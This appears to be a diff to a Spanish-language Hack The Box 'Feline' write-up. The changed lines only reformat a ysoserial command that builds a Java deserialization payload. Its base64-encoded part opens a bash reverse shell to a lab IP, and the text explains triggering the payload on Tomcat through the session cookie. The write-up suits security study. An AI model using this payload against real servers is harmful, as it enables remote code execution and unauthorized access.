@@ -129,7 +129,9 @@ Como se indica en hacktricks, vamos a encodear el payload en base64:
 ![feline-payload-base64](/assets/imagenes/2021-02-20-feline-HTB/feline-payload-base64.png)
 
 El comando final para generar el payload sería:
-* ```java -jar ysoserial-master-4df2ee2bb5-1.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy8xMjM0IDA+JjEK}|{base64,-d}|-{bash,-i}">payload.session```
+* ```
+  java -jar ysoserial-master-4df2ee2bb5-1.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy8xMjM0IDA+JjEK}|{base64,-d}|-{bash,-i}">payload.session
+  ```
 
 Una vez hemos generado nuestro archivo payload.session lo subimos al servidor y a través de la cookie de sesion lo leemos.
 Esto se da porque tomcat maneja las sesiones a traves de ficheros .session, pero al llamarlos a traves de la cookie de sesión no requiere que le pongamos la extensión ya que la añade de manera automática.
